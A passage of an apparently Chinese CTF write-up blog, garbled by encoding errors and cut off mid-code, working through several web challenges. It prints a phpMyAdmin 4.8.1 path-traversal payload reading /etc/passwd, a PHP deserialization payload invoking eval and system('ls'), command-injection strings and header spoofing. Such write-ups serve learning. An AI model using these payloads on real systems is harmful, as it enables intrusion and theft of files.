(<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åªæœ‰ä¼ <code>?b=|\\\\</code>æ‰ä¼š<code>echo</code>æ£€æµ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»å¯ä»¥åˆ©ç”¨<code>\</code>è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œæ¯”å¦‚<code>l\s</code>ï¼Œ<code>l\s%20/</code>,<code>c\at%20fl\ag</code>ç­‰ã€‚</p><p>åœ¨burpä¸­å¦‚æœä½¿ç”¨ç©ºæ ¼ä¼šè¢«è¯†åˆ«ä¸ºå…¶ä»–çš„å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œç©ºæ ¼ç”¨<code>%20</code>æ›¿æ¢ã€‚</p><p>ç»¼ä¸Šï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå¾—åˆ°flagã€‚</p><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p><img src="/img/db1.png" alt="db1"></p><p>???</p><p>ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°<code>robots.txt</code>è¿˜æœ‰<code>/phpmyadmin/</code>ï¼Œçœ‹çœ‹éƒ½æœ‰å•¥ï¼š</p><p><code>robots.txt</code>æç¤º<code>phpinfo.php</code>ï¼Œ<code>/phpmyadmin/</code>ä¸ç™»å½•å¯ä»¥ç›´æ¥è®¿é—®æ•°æ®åº“ç®¡ç†ç•Œé¢ï¼š</p><p><img src="/img/db2.png" alt="db2"></p><p>åé¢å°±æ— å¤„ä¸‹æ‰‹äº†ã€‚ã€‚å»ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹<code>wp</code>ï¼Œè¿™é¢˜è€ƒçš„æ˜¯<code>phpmyadmin4.8.1</code>ç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´:<code>include $_REQUEST[&#39;target&#39;];</code></p><p>ç›´æ¥åˆ©ç”¨ç°æˆçš„<code>payload</code>:<code>target=db_sql.php%253f/../../../../../../../../etc/passwd</code>ï¼Œå‘ç°å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚åé¢å†ç¿»ç¿»<code>flag</code>çš„ä½ç½®å°±è¡Œäº†ã€‚</p><p><code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code></p><p><code>flag&#123;14b071f4-a712-4a14-b3ce-d6bc07df4506&#125;</code></p><p>ä¸è¿‡æˆ‘çœ‹æ–‡ç« ä¸­éƒ½å†™äº†<code>$_REQUEST[&#39;target&#39;]</code>ï¼Œä½†å°è¯•<code>POST</code>æäº¤æ‹¿ä¸åˆ°ç»“æœã€‚è€Œä¸”åœ¨<code>?target</code>å‰åŠ ä¸ª<code>/</code>å°±ç™½å±äº†ã€‚ã€‚ä¸è¿‡å³é”®çœ‹æºç è¿˜æ˜¯èƒ½çœ‹åˆ°å›æ˜¾ï¼Œä¸çŸ¥é“å’‹å›äº‹ã€‚</p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>è¿›ç¯å¢ƒå‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/flagpy1.png" alt="flagpy1"></p><p>çœ‹ä¸‹æºç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>  hash = <span class="hljs-title function_">hex_md5</span>(code);<br>  <span class="hljs-keyword">return</span> hash;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> code = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;vcode&quot;</span>).<span class="hljs-property">value</span>;<span class="hljs-comment">//è·å–ç”¨æˆ·çš„è¾“å…¥</span><br>  <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">hex_md5</span>(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&quot;</span>);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;./flag.php&quot;</span><span class="hljs-comment">//é‡å®šå‘åˆ°å½“å‰ç›®å½•ä¸‹çš„flag.php</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&quot;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æˆæƒç &quot;</span>);<br>  &#125;<br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹å®Œæƒ³äº†ä¸€ä¸‹ï¼Œç›´æ¥å»<code>flag.php</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><code>http://node4.buuoj.cn:25037/flag.php</code></p><p><img src="/img/flagpy2.png" alt="flagpy2"></p><p>æç¤ºä¿å­˜äº†è´­ä¹°è€…çš„IPï¼Œå¯ä»¥åˆ©ç”¨<code>XFF</code>ä¼ªé€ ã€‚<code>é™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag</code>ï¼Œç›´æ¥<code>XFF 127.0.0.1</code>è¯•è¯•ï¼Ÿ</p><p><img src="/img/flagpy3.png" alt="flagpy3"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>é¢˜ç›®æç¤º<code>unicode</code>å’Œ<code>python</code></p><p>äº†è§£äº†ä¸‹<code>unicode</code>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Unicode</span>æ˜¯ä¸€ç§å­—ç¬¦ç¼–ç æ ‡å‡†ï¼Œç”¨äºè¡¨ç¤ºæ–‡æœ¬ä¸­çš„å­—ç¬¦ã€‚å®ƒä¸ºä¸–ç•Œä¸Šå‡ ä¹æ‰€æœ‰çš„å­—ç¬¦éƒ½åˆ†é…äº†ä¸€ä¸ªå”¯ä¸€çš„æ•°å­—æ ‡è¯†ï¼Œè¿™ä¸ªæ ‡è¯†è¢«ç§°ä¸º<span class="hljs-string">&quot;ç ç‚¹&quot;</span>ã€‚Unicodeçš„ç›®æ ‡æ˜¯ä¸ºå…¨çƒèŒƒå›´å†…çš„æ‰€æœ‰å­—ç¬¦æä¾›ä¸€ä¸ªç»Ÿä¸€çš„ç¼–ç æ–¹æ¡ˆï¼Œä»¥è§£å†³ä¸åŒå›½å®¶å’Œåœ°åŒºä½¿ç”¨ä¸åŒå­—ç¬¦ç¼–ç çš„é—®é¢˜ã€‚<br><br><span class="hljs-attribute">Unicode</span>ä½¿ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºæ¯ä¸ªå­—ç¬¦çš„ç ç‚¹ï¼Œä¾‹å¦‚å­—æ¯<span class="hljs-string">&quot;A&quot;</span>çš„ç ç‚¹æ˜¯U+<span class="hljs-number">0041</span>ï¼Œæ±‰å­—<span class="hljs-string">&quot;ä¸­&quot;</span>çš„ç ç‚¹æ˜¯U+<span class="hljs-number">4</span>E2Dã€‚Unicodeå®šä¹‰äº†è¶…è¿‡<span class="hljs-number">130</span>,<span class="hljs-number">000</span>ä¸ªç ç‚¹ï¼Œå…¶ä¸­åŒ…æ‹¬å„ç§è¯­è¨€çš„å­—ç¬¦ã€æ ‡ç‚¹ç¬¦å·ã€ç¬¦å·ã€è¡¨æƒ…ç¬¦å·ç­‰ã€‚<br></code></pre></td></tr></table></figure><p><img src="/img/us1.png" alt="us1"></p><p>è¯•äº†è¯•è´­ä¹°å‰ä¸‰ç§éƒ½æç¤ºï¼š</p><p><img src="/img/unishop2.png" alt="unishop2"></p><p>ä¹°æœ€åä¸€ä¸ªä¼šæ˜¾ç¤º:<code>Only one char(?) allowed!</code>ï¼Œæ„æ€æ˜¯è¿™ä¸ª<code>Price</code>åªèƒ½å¡«ä¸€ä¸ªå­—ç¬¦ï¼Ÿæºç é‡Œé¢æœ‰ä¸‹é¢è¿™æ®µæç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">meta charset=&quot;utf-8&quot;&gt;<span class="hljs-comment">&lt;!--Ah,really important,seriously. --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Unicorn shop<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-comment">&lt;!-- Don&#x27;t be frustrated by the same view,we&#x27;ve changed the challenge content.--&gt;</span><br></code></pre></td></tr></table></figure><p>å»ç½‘ä¸Šæ‰¾äº†ä¸‹wpï¼Œå’Œæç¤ºçš„<code>Unicode</code>æœ‰å…³ï¼šå…ˆæŠŠ<code>Item ID</code>å’Œ<code>Price</code>éƒ½æ”¾ç©ºï¼Œçœ‹çœ‹æŠ¥é”™ä¿¡æ¯ï¼š</p><p><img src="/img/unishop3.png" alt="unishop3"></p><p>å¯ä»¥å‘ç°ä»–ç”¨äº†<code>unicodedata.numeric()</code>å‡½æ•°å»å¤„ç†è¿™ä¸ª<code>price</code>ï¼Œè¿™ä¸œè¥¿ä¼šè·å– Unicode å­—ç¬¦çš„æ•°å€¼è¡¨ç¤ºï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; import unicodedata<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-number">1.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;11&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-number">3.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;33&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;ğ„£&#x27;</span>)<br><span class="hljs-number">2000.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;ä¸‡&#x27;</span>)<br><span class="hljs-number">10000.0</span><br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨è¿™ä¸ªç½‘ç«™<code>https://www.compart.com/en/unicode</code>æ‰¾<code>numeric value</code>å¤§äº<code>1337</code>çš„å°±è¡Œ</p><p><img src="/img/unishop4.png" alt="unishop4"></p><p>ç›´æ¥æŠŠç›®æ ‡ç¬¦å·å¤åˆ¶ç²˜è´´åˆ°<code>Price</code>ä»·æ ¼é‡Œå°±å¥½äº†ã€‚</p><p>è¡¥å……ï¼šè¿™é¢˜æºç é‡Œæœ‰æ®µ<code>price = urlib.unquote(price).decode(&#39;utf-8&#39;)</code>ï¼Œå³å…ˆæŠŠè¾“å…¥<code>url</code>è§£ç åå†ç»è¿‡<code>utf-8</code>ç¼–ç èµ‹å€¼ç»™<code>price</code>ï¼Œç„¶åç”¨<code>unicodedata.numeric()</code>å¤„ç†<code>price</code>ã€‚</p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡å…ˆæ‰¾ç›®æ ‡å­—ç¬¦çš„<code>utf-8</code>ç¼–ç ï¼ŒæŠŠå®ƒè½¬æ¢æˆå¯¹åº”çš„<code>url</code>å½¢å¼(æŠŠ<code>0x</code>æ¢æˆ<code>%</code>å°±è¡Œï¼Œå†å»æ‰ç©ºæ ¼)</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap-è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap-è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap(è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾)"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap(è¿™é¢˜è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾)</h2><p><img src="/img/nmap1.png" alt="nmap1"></p><p>ä¸€ä¸ªç«¯å£æ‰«æç½‘ç«™ï¼Œåˆæ­¥çŒœæµ‹å­˜åœ¨<code>RCE</code>æˆ–è€…æ–‡ä»¶åŒ…å«ã€‚</p><p>å…ˆçœ‹æºç é‡Œæœ‰å•¥ï¼š<code>&lt;!-- flag is in /flag --&gt;</code></p><p>å—¯ï¼Œé‚£åº”è¯¥æ˜¯è¦<code>RCE</code>äº†</p><p>éšä¾¿è¾“ä¸ª<code>127.0.0.1</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/namp2.png" alt="namp2"></p><p>æä¾›äº†ä¸€äº›ç«¯å£ä¿¡æ¯ï¼Œè¿™ä¸ª<code>URL</code>å€¼å¾—æ³¨æ„ï¼š</p><p><code>/result.php?f=f7909</code></p><p><code>to index</code>å°±æ˜¯è¿”å›é¦–é¡µï¼Œ<code>to list</code>æ˜¯è¿™ä¹ˆä¸ªç•Œé¢ï¼š</p><p><img src="/img/nmap3.png" alt="nmap3"></p><p><code>File</code>é‚£ä¸€æ å°±æ˜¯<code>result.php</code>åº•ä¸‹çš„<code>f</code>å‚æ•°ï¼Œå°è¯•äº†å…­æ¬¡å‘ç°æ–‡ä»¶ååº”è¯¥äº”å…­ä½åå…­è¿›åˆ¶çš„éšæœºæ•°ã€‚ä»–è¿™ä¸œè¥¿çš„è¿è¡Œè¿‡ç¨‹å¤§æ¦‚å°±æ˜¯æ‰«æç›®æ ‡<code>IP</code>çš„ç«¯å£ï¼Œç„¶åç»™ç»“æœäº”ä½åå…­è¿›åˆ¶éšæœºæ•°çš„æ–‡ä»¶åï¼Œå­˜å‚¨èµ·æ¥å¦‚æœæƒ³è¯»å–åˆ©ç”¨<code>result.php</code>è¿›è¡Œäº†æ–‡ä»¶åŒ…å«ã€‚</p><p>ä¸è¿‡ç»“æœä¸­å­˜åœ¨ä¸€ä¸ªè­¦å‘Šï¼ŒæŠ“åŒ…çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/nmap4.png" alt="nmap4"></p><p>é¦–å…ˆï¼Œè¾“å…¥<code>IP</code>åä¼šè¿›è¡Œ302é‡å®šå‘ã€‚</p><p>å¦‚æœéšä¾¿æ›´æ”¹<code>f</code>çš„å€¼å‘¢ï¼Ÿä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼š</p><p><img src="/img/nmap5.png" alt="nmap5"></p><p>  <code>simplexml_load_file()</code>ä¼šæŠŠæŠŠXML æ–‡æ¡£è½½å…¥å¯¹è±¡ä¸­ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æŠŠç»“æœä»¥XMLæ–‡ä»¶çš„å½¢å¼å­˜å‚¨ã€‚</p><p><code>127.0.0.1;ls</code>æç¤º<code>Host maybe down</code>ï¼Œæ¢æˆ<code>127.0.0.1 ;</code>å‘ç°ä¼šç»™<code>;</code>å‰åŠ ä¸€ä¸ª<code>\</code>è¿›è¡Œè½¬ä¹‰å˜æˆ<code>127.0.0.1 \;</code>ï¼Œä½†å¦‚æœæ²¡æœ‰è¿™ä¸ªç©ºæ ¼ä¼šç›´æ¥æŠ¥é”™<code>host maybe down</code></p><p>åé¢æ£é¼“åŠå¤©ä¸çŸ¥é“æ€ä¹ˆå¼„äº†ï¼Œæ‰¾äº†<code>wp</code>å‘ç°æ˜¯è‡ªå·±æ€è·¯é”™äº†ï¼Œè¿™é¢˜è€ƒçš„æ˜¯<code>Nmap</code>çš„ä¸€äº›ç”¨æ³•ã€‚</p><p>è¿˜æ²¡åšå®Œå…ˆæ”¾ä¸€æ”¾ã€‚ã€‚ä¸€çœ‹è¿™ä¸¤ä¸ª<code>escape</code>å‡½æ•°æˆ‘å°±å¤´ç–¼</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œå°è¯•å³é”®çœ‹æºç æ²¡å•¥ååº”ï¼Œç›´æ¥åœ¨URLåŠ <code>view-source:</code></p><p><img src="/img/real1.png" alt="real1"></p><p>å‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œç›´æ¥è®¿é—®ï¼š<code>./time.php?source</code>(æœ¬æ¥è¿˜æƒ³æ‹¿dirsearchæ‰«æ¥ç€ï¼Œçœ‹æ¥æ²¡å¿…è¦äº†)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);  <span class="hljs-comment">//ç›¸å½“äºè°ƒç”¨äº†bè¿™ä¸ªå‡½æ•°è€Œä¸”å‚æ•°æ˜¯aï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ‰§è¡Œå‘½ä»¤</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))  <span class="hljs-comment">//è‹¥sourceè¢«èµ‹å€¼ï¼Œé«˜äº®æºç å¹¶die(0)ç»“æŸã€‚åé¢è¦ç»™dataèµ‹å€¼</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<span class="hljs-comment">//ååºåˆ—åŒ–GETä¼ çš„data</span><br><br><br><span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">04</span> <span class="hljs-number">12</span>:<span class="hljs-number">27</span>:<span class="hljs-number">15</span><br><br><br><br></code></pre></td></tr></table></figure><p>ç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼Œç›´æ¥æ„é€ æˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‘½ä»¤å°±è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;eval&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸è¿‡æ²¡æœ‰è¿è¡Œï¼Ÿåé¢æ¢äº†å…¶å®ƒçš„å‘½ä»¤ä¹Ÿæ˜¯æ²¡æœ‰å›æ˜¾ã€‚æ„Ÿè§‰æ˜¯è¢«è¿‡æ»¤äº†(å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰å¾ˆå¤š)ï¼Œä½†ä¹Ÿæƒ³ä¸åˆ°å…¶å®ƒæ€è·¯ï¼Œå»çœ‹äº†å…¶å®ƒå¸ˆå‚…çš„wpå‘ç°è¦ç”¨<code>assert</code>è¿™ä¸ªå‡½æ•°ï¼Œæ­£å¥½å€Ÿè¿™ä¸ªæœºä¼šæ¢³ç†ä¸€ä¸‹<code>RCE</code>ä¸­å¸¸ç”¨çš„å‡ ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œè¿˜æœ‰ä»–ä»¬ä¹‹é—´çš„å…³ç³»ï¼š</p><p>æˆ‘ä¸ªäººè®¤ä¸ºæœ€å¸¸è§çš„è‚¯å®šæ˜¯<code>eval</code>å’Œ<code>system</code>ï¼Œå…ˆè¯´ä¸‹å®ƒä¿©ä¹‹é—´æœ€å¤§çš„å·®åˆ«(ä¸ªäººè§‚ç‚¹)ï¼š</p><p><strong>evalç±»å‹å‡½æ•°æ˜¯ä»£ç æ‰§è¡Œè€Œä¸æ˜¯å‘½ä»¤æ‰§è¡Œ</strong></p><p><strong>systemç±»å‹å‡½æ•°æ˜¯å‘½ä»¤æ‰§è¡Œè€Œä¸æ˜¯ä»£ç æ‰§è¡Œ</strong>ï¼Œä¸¾å‡ ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);    <span class="hljs-comment">//2,æ³¨æ„æœ«å°¾çš„åˆ†å·</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);  <span class="hljs-comment">//1+1;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$num</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$a = <span class="hljs-subst">$num</span>;&quot;</span>);   <span class="hljs-comment">//åªæœ‰è¿™ä¸ªå¹¶æ— ä»»ä½•å›æ˜¾ï¼Œå¯é€šè¿‡echoæˆ–var_dumpè·å¾—å›æ˜¾</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;\$b = <span class="hljs-subst">$num</span>;&quot;</span>);   <br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//æ˜¾ç¤º1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<span class="hljs-comment">//æ˜¾ç¤ºNULL</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);   <span 